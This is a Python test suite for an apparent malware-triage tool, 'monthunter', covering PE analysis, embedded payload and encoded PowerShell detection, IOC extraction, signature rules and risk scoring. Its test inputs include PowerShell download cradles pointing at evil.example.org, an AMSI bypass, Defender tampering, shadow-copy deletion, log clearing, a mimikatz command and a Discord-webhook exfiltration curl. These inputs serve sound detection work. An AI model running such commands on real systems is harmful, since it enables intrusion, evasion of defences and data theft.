import base64

import pytest

from monthunter.core import analyze_one
from monthunter.detectors import (
    decode_powershell_commands,
    detect_embedded_payloads,
    extract_extra_iocs,
    extract_iocs_from_text,
    scan_with_json_signatures,
)
from monthunter.extractors import analyze_pe_structure
from monthunter.scoring import compute_risk

from .helpers import build_minimal_pe

SIGS = __import__("pathlib").Path(__file__).parents[1] / "monthunter" / "signatures.json"


# --- PE analysis -----------------------------------------------------------
def test_pe_clean_section_has_no_rwx_anomaly(tmp_path):
    p = tmp_path / "a.exe"
    p.write_bytes(build_minimal_pe())
    res = analyze_pe_structure(p)
    assert res["is_pe"] and res["ok"]
    assert not any(a.startswith("rwx_section") for a in res["anomalies"])
    assert "no_imports" in res["anomalies"]


def test_pe_flags_rwx_packer_section_and_bad_timestamp(tmp_path):
    p = tmp_path / "b.exe"
    p.write_bytes(build_minimal_pe(section_name=b"UPX0", section_flags=0xE0000020, timestamp=0))
    res = analyze_pe_structure(p)
    assert "rwx_section:UPX0" in res["anomalies"]
    assert "packer_section:UPX0" in res["anomalies"]
    assert "suspicious_timestamp" in res["anomalies"]


def test_pe_large_overlay(tmp_path):
    p = tmp_path / "c.exe"
    p.write_bytes(build_minimal_pe(overlay=b"A" * (1024 * 1024 + 10)))
    res = analyze_pe_structure(p)
    assert res["overlay_size"] >= 1024 * 1024
    assert "large_overlay" in res["anomalies"]


def test_risky_api_name_normalisation():
    from monthunter.extractors import _risky_api_reason

    assert _risky_api_reason("ShellExecuteExW") == "Command execution"
    assert _risky_api_reason("InternetOpenA") == "Network beaconing"
    assert _risky_api_reason("RegSetValueExW") == "Registry modification"
    assert _risky_api_reason("CreateFileW") is None


# --- Embedded payloads / PowerShell / IOCs ---------------------------------
def test_embedded_pe_detected_but_not_own_header():
    pe = build_minimal_pe()
    assert detect_embedded_payloads(pe)["embedded_pe"] == []
    wrapped = b"junk-prefix-" + pe
    assert detect_embedded_payloads(wrapped)["embedded_pe"] == [len(b"junk-prefix-")]


def test_base64_embedded_pe_detected():
    blob = base64.b64encode(build_minimal_pe())
    assert detect_embedded_payloads(b"text " + blob + b" text")["base64_pe"] == 1


def test_fake_mz_is_not_a_pe():
    assert detect_embedded_payloads(b"xxMZxxxxxxxxxxxx" * 50)["embedded_pe"] == []


def test_powershell_encoded_command_decoded():
    cmd = "Invoke-WebRequest http://evil.example.org/a.ps1"
    enc = base64.b64encode(cmd.encode("utf-16le")).decode()
    out = decode_powershell_commands(f"powershell -nop -w hidden -enc {enc}")
    assert out == [cmd]
    assert decode_powershell_commands("powershell -enc !!!notbase64!!!") == []


def test_wallets_checksum_validated():
    good = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa"  # Bitcoin genesis address
    bad = "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNb"  # checksum broken
    res = extract_extra_iocs(f"send to {good} or {bad}")
    assert res["wallets"] == [good]


def test_monero_wallet_shape():
    addr = "4A" + "B" * 93
    assert extract_extra_iocs(addr)["wallets"] == [addr]


def test_exfil_channels():
    text = "https://discord.com/api/webhooks/123456789/abc-DEF_ghi and https://api.telegram.org/bot123456:" + "A" * 35
    res = extract_extra_iocs(text)
    assert len(res["exfil"]) == 2


def test_benign_infrastructure_domains_filtered():
    text = "xmlns http://schemas.microsoft.com/win/2004 http://www.w3.org/1999/xhtml c2.example.org crl.digicert.com"
    assert extract_iocs_from_text(text)["domains"] == ["c2.example.org"]


# --- Signatures ------------------------------------------------------------
def test_every_rule_has_mitre_ids():
    import json

    rules = json.loads(SIGS.read_text())["rules"]
    assert all(r.get("mitre") for r in rules), [r["name"] for r in rules if not r.get("mitre")]


def test_signature_findings_carry_mitre():
    hits = scan_with_json_signatures(SIGS, ["sekurlsa::logonpasswords"])
    assert hits[0]["mitre"] == ["T1003.001"]


@pytest.mark.parametrize(
    "text,rule",
    [
        ("[Ref].Assembly.GetType('x').GetField('amsiInitFailed','NonPublic,Static')", "SUSP_AMSI_BYPASS"),
        ("Add-MpPreference -ExclusionPath C:\\temp", "SUSP_DEFENDER_TAMPERING"),
        ("reg add HKCU\\x /v a ; schtasks /create /tn a", "SUSP_WINDOWS_PERSISTENCE"),
        ("curl https://discord.com/api/webhooks/1/x", "SUSP_EXFIL_WEBHOOK"),
        ("vssadmin delete shadows /all", "SUSP_SHADOW_COPY_DELETION"),
        ("wevtutil cl Security", "SUSP_LOG_CLEARING"),
        ("GetAsyncKeyState SetWindowsHookEx GetForegroundWindow", "SUSP_KEYLOGGER"),
    ],
)
def test_new_rules_fire(text, rule):
    assert rule in {h["rule_name"] for h in scan_with_json_signatures(SIGS, [text])}


def test_new_rules_quiet_on_benign_text():
    benign = "Startup folder, a keyboard shortcut, discord support page, the event viewer, windows defender settings"
    assert scan_with_json_signatures(SIGS, [benign]) == []


# --- Scoring & pipeline ----------------------------------------------------
def test_risk_empty_is_none():
    assert compute_risk({}) == {"score": 0, "level": "none", "reasons": []}


def test_risk_combines_and_caps():
    summary = {
        "signatures": [{"rule_name": "A", "severity": "CRITICAL"}, {"rule_name": "B", "severity": "CRITICAL"}],
        "embedded": {"embedded_pe": [10]},
        "hints": {"powershell_encoded_command": True},
        "iocs": {"exfil": ["x"]},
    }
    r = compute_risk(summary)
    assert r["score"] == 100 and r["level"] == "critical"


def test_risk_dynamic_behaviours():
    r = compute_risk({"dynamic": {"ran": True, "findings": [{"behavior": "persistence_write"}], "network_attempts": [{"ip": "8.8.8.8", "port": 1}]}})
    assert r["score"] == 8 + 15 + 10


def test_pipeline_adds_hashes_risk_and_decoded_powershell(make_sample, tmp_path):
    cmd = "IEX (New-Object Net.WebClient).DownloadString('http://evil.example.org/p')"
    enc = base64.b64encode(cmd.encode("utf-16le")).decode()
    payload = b"MZ-stub text powershell -nop -enc " + enc.encode() + b" tail " + build_minimal_pe()
    p = make_sample("x.bin", payload)
    summary = analyze_one(str(p), tmp_path / "out")
    assert len(summary["md5"]) == 32 and len(summary["sha1"]) == 40 and summary["size"] == len(payload)
    assert summary["hints"]["powershell_encoded_command"] is True
    assert "evil.example.org" in summary["iocs"]["domains"]
    assert summary["embedded"]["embedded_pe"]
    assert summary["risk"]["score"] > 0
